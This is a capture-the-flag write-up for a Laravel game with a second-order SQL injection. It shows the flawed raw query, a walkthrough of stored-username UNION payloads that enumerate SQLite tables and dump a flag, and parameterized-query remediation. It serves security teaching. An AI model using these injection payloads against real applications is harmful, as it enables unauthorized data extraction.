# 🎮 Guess Royal — Laravel Second-Order SQL Injection Challenge

## 🧩 Overview

**Guess Royal** is a Laravel-based guessing game that hides a **second-order SQL injection** within its codebase.  
This challenge showcases how dangerous unsanitized data persistence can be — especially when user-controlled input is stored and later reused in raw SQL queries.

> 💡 Difficulty: **Hard**  

---

## 🚀 Environment

- **Framework:** Laravel + [Octane](https://laravel.com/docs/octane) (FrankenPHP backend)
- **Containerization:** [Laravel Sail](https://laravel.com/docs/sail) for Dockerized deployment
- **Dependencies:** Managed via Composer and Node — initialized through `./vendor/bin/sail`

---

## 🕵️‍♂️ Challenge Summary

In version 2 of the game, a raw query uses the logged-in user’s **`name`** directly in SQL:

```php
Game::whereRaw("user_name = '{user->name}'")->get();
```

Since usernames are stored during registration, malicious input can be saved and **executed later** — leading to a **second-order SQL injection**.  
Automated tools like `sqlmap` often miss this because payloads are interpreted in a later context.

---

## 🔍 Exploitation Walkthrough

### 1. Registration Payload

Register with a crafted username:

```
name' OR '1'='1
```

### 2. Trigger Injection

Access the vulnerable endpoint:

```
GET /games/history
```

If successful, the app returns SQL errors or injected results.

### 3. Union Enumeration

Find the correct column count:

```
username' UNION SELECT 1,2,3,4,5,6,7,8-- -
```

Identify a text column with:

```
username' UNION SELECT 1,2,3,sqlite_version(),5,6,7,8-- -
```

List tables:

```
username' UNION SELECT 1,2,3,name,5,6,7,8 FROM sqlite_master WHERE type='table'-- -
```

Dump the flag:

```
username' UNION SELECT id,2,3,value,5,6,7,8 FROM flags-- -
```

Response:

```json
{
  "result": "HTB{ThE_GuEss_ROyAl_MAstEr}"
}
```

---

## 🧱 Remediation

- Use parameterized queries:  

  ```php
  Game::where('user_name', $user->name)->get();
  ```

- Avoid `whereRaw()` with interpolated input

- Sanitize & validate usernames

- Limit DB user privileges

---

## 💡 Lessons Learned

- Frontend assets can reveal hidden subdomains.  
- Second-order injections bypass typical fuzzing tools.  
- ORM features (like Eloquent) provide safer query handling.

---

## 🧰 Tech Stack

| Component  | Technology          |
| ---------- | ------------------- |
| Backend    | Laravel 12          |
| Server     | FrankenPHP (Octane) |
| Container  | Laravel Sail        |
| DB         | SQLite              |

---

## 📚 References

- [Laravel Query Builder — Parameter Binding](https://laravel.com/docs/12.x/queries)  
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)  
- [SQLite Built-in Functions](https://www.sqliz.com/sqlite-ref/system-function/)  

---

### 💬 Author Note

This challenge highlights how **stored data can become a weapon** when reused unsafely in SQL contexts.  
Always treat persisted user input as untrusted — even after validation.

---

© 2025 Abderrahim El Ouariachi — All rights reserved.
